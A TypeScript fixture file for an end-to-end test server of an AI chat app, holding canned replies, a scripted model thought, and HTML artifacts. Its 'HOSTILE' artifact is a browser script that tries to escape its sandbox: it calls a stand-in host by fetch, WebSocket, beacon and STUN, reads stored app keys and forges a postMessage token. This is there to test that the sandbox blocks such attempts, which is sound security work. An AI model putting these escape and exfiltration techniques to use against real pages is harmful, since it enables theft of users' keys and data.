// What the e2e server's fake engines answer (e2e/server.ts), for the specs to look for.
export const REPLY = "Streamed reply from the fake claude.";
// E2E_THINKING: what every Claude turn thinks before its tool call (SPEC "Reasoning")
export const THOUGHT = "They want to see what is here. A listing first, then a short answer.";
export const SOL_REPLY = "Answered by the fake ChatGPT plan.";
// the tool's output when E2E_TOOL_ERROR fails it: nothing in the text says it failed, only the flag
export const TOOL_ERROR = "ls: cannot open directory '.': Permission denied";

// E2E_PATTERNS: Claude Code's TodoWrite input, before and after the work (the Plan pattern)
export const PLAN_START = {
  todos: [
    { activeForm: "Searching the web", content: "Search the web", status: "in_progress" },
    { activeForm: "Reading the page", content: "Read the page", status: "pending" },
    { activeForm: "Writing the answer", content: "Write the answer", status: "pending" },
  ],
};
export const PLAN_DONE = { todos: PLAN_START.todos.map((t) => ({ ...t, status: "completed" })) };
// WebSearch's result as Claude Code words it, and the page WebFetch reads (the Sources pattern)
export const SEARCH_LINKS = [
  { title: "Streaming replies", url: "https://docs.example.com/streaming" },
  { title: "A fake claude", url: "https://fake.example.org/claude" },
];
export const FETCHED = "https://docs.example.com/streaming";
export const SEARCH_RESULT = `Web search results for query: "fake claude streaming"\n\nLinks: ${JSON.stringify(SEARCH_LINKS)}\n\nBoth pages describe streamed replies.`;

// E2E_SUBAGENTS (SPEC M7a): the turn spawns two subagents; "notes" reports at once, "scout" waits for
// a message from its card, then reports. Fake data only.
export const NOTES_TASK = "Which notes mention the trip, and which is the newest?";
export const NOTES_REPORT = "Two notes mention the trip; the newest (Oct 3) has the dates.";
export const SCOUT_TASK = "Find the trip dates in the demo notes.";
export const SCOUT_REPORT = "The trip is Oct 3 to Oct 9; the hotel is booked.";
export const SPAWNED = "Two subagents are on it: notes and scout.";

// E2E_ARTIFACTS (SPEC "Artifacts"): fake pages only. "ui": the first turn publishes LANDING (its
// input streamed slowly, so the draft shows), the second edits its heading; "hostile": the turn
// publishes HOSTILE, which tries every way out of its sandbox and writes what happened into #out.
export const ARTIFACT = "trip";
export const LANDING_HEADING = "Weekend in Lisbon";
export const EDITED_HEADING = "Long weekend in Lisbon";
const days = ["Friday: Alfama walk, tram 28", "Saturday: Belém, pastéis, the river", "Sunday: LX Factory, sunset at Miradouro"];
export const LANDING = `<!doctype html><html><head><meta charset="utf-8"><title>Trip</title><style>body{font:16px/1.5 system-ui,sans-serif;margin:0;padding:24px;background:#f6f3ee;color:#1d1b18}h1{font-size:28px;margin:0 0 8px}ol{padding-left:20px}li{margin:6px 0}.tag{display:inline-block;padding:2px 10px;border-radius:999px;background:#1d1b18;color:#f6f3ee;font-size:12px}@media (prefers-color-scheme:dark){body{background:#1b1a18;color:#eeeae3}.tag{background:#eeeae3;color:#1b1a18}}</style></head><body><span class="tag">3 days</span><h1 id="heading">${LANDING_HEADING}</h1><p id="ran">scripts did not run</p><ol>${days.map((d) => `<li>${d}</li>`).join("")}</ol><p id="draft-marker">A plan for three easy days.</p><script>document.getElementById("ran").textContent="scripts run";document.body.dataset.ran="yes"</script></body></html>`;
export const LANDING_EDIT = { edits: [{ new: `<h1 id="heading">${EDITED_HEADING}</h1>`, old: `<h1 id="heading">${LANDING_HEADING}</h1>` }], name: ARTIFACT };
export const PUBLISHED = "There is the plan, as a page.";
export const EDITED = "The heading says long weekend now.";

// every attempt goes to http://outside.test, which e2e/artifacts-security.spec.ts watches for
export const OUTSIDE = "http://outside.test";
const hostileScript = `
const results={};
const out=document.getElementById("out");
const record=(k,v)=>{results[k]=v;out.textContent=JSON.stringify(results)};
const attempt=async(k,f)=>{try{const r=await f();record(k,"ok:"+String(r).slice(0,60))}catch(e){record(k,"blocked:"+(e&&e.name||"error"))}};
const failed=(k)=>new Error(k);
Promise.all([
attempt("fetch",()=>fetch("${OUTSIDE}/fetch").then(r=>r.status)),
attempt("xhr",()=>new Promise((res,rej)=>{const x=new XMLHttpRequest();x.open("GET","${OUTSIDE}/xhr");x.onload=()=>res(x.status);x.onerror=()=>rej(failed("xhr"));x.send()})),
attempt("websocket",()=>new Promise((res,rej)=>{const w=new WebSocket("ws://outside.test/ws");w.onopen=()=>res("open");w.onerror=()=>rej(failed("ws"))})),
attempt("appSocket",()=>new Promise((res,rej)=>{const w=new WebSocket("ws://"+location.host+"/ws");w.onopen=()=>res("open");w.onerror=()=>rej(failed("ws"))})),
attempt("image",()=>new Promise((res,rej)=>{const i=new Image();i.onload=()=>res("loaded");i.onerror=()=>rej(failed("img"));i.src="${OUTSIDE}/image.png"})),
attempt("cookie",()=>{document.cookie="pwned=1";return document.cookie}),
attempt("localStorage",()=>{localStorage.setItem("pwned","1");return localStorage.getItem("app-key")}),
attempt("parentDocument",()=>parent.document.title),
attempt("parentStorage",()=>parent.localStorage.getItem("app-key")),
attempt("topLocation",()=>{top.location.href="${OUTSIDE}/top";return "assigned"}),
attempt("windowOpen",()=>{const w=window.open("${OUTSIDE}/popup");if(!w)throw failed("popup");return "opened"}),
attempt("rtc",()=>new RTCPeerConnection({iceServers:[{urls:"stun:outside.test:3478"}]})),
attempt("rtcInFrame",()=>{const f=document.createElement("iframe");document.body.append(f);const R=f.contentWindow.RTCPeerConnection;return new R({iceServers:[{urls:"stun:outside.test:3478"}]})}),
attempt("sendBeacon",()=>{if(!navigator.sendBeacon("${OUTSIDE}/beacon","x"))throw failed("beacon");return "sent"}),
]).then(()=>{document.body.dataset.done="yes"});
document.getElementById("forged").addEventListener("click",()=>parent.postMessage({type:"open",token:"forged",url:"https://example.com/forged"},"*"));
document.getElementById("selfnav").addEventListener("click",()=>{location.href="${OUTSIDE}/self"});
`;
export const HOSTILE = `<!doctype html><html><head><title>Hostile</title></head><body><pre id="out">{}</pre><a id="link" href="https://example.com/opened">a link out</a> <button id="forged">forged open</button> <button id="selfnav">navigate away</button><script>${hostileScript}</script></body></html>`;
